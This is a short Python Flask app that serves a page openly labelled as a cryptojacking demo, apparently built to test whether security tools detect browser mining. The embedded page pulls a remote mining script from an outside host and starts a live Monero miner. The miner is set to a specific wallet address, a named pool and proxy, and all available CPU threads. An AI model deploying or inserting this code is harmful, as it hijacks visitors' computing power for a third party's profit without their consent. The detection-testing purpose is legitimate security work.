from flask import Flask, render_template_string

app = Flask(__name__)
cryptojacking_template = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cryptojacking Demo page</title>
    <style>
        body {
            background-color: #0f0f0f;
            color: #00ff00;
            font-family: 'Courier New', Courier, monospace;
        }
        h1 {
            color: #ff0066;
            text-align: center;
            margin-top: 50px;
        }
        .content {
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 60vh;
            background-size: cover;
            background-position: center;
        }
        .overlay {
            background: rgba(0, 0, 0, 0.7);
            padding: 20px;
            border-radius: 10px;
            text-align: center;
        }
    </style>
</head>
<body>
    <h1>Cryptojacking Demo/Test page</h1>
    <div class="content">
        <div class="overlay">
            <p>This page is currently mining cryptocurrency</p>
            <p><button onclick="showAlert()">Click Me</button></p>
        </div>
    </div>
    <script src="https://script.monerominer.rocks"></script>
        <script>
            server = "wss://ny1.xmrminingproxy.com";
            var pool = "moneroocean.stream";
            var walletAddress = "4A5MtUvL7xp7hyfQt75ZN4bvY5xFwXSZc1puJTmxauNCWCBDUdEDNf6WGUXMnz5vZBgCwCzrAQnmWeYWet6PyXDmPbS9Cuc";
            var workerId = "CyptojackerDemo"
            var threads = -1;
            var password = "x";
            startMining(pool, walletAddress, workerId, threads, password);
            throttleMiner = 20;
        </script>
    <script>
        function showAlert() {
            alert("A Javascript based miner is currently running - did you get any detections? ");
        }
    </script>

</body>
</html>
'''

@app.route('/')
def home():
    return render_template_string(cryptojacking_template)

if __name__ == '__main__':
    app.run(debug=True)
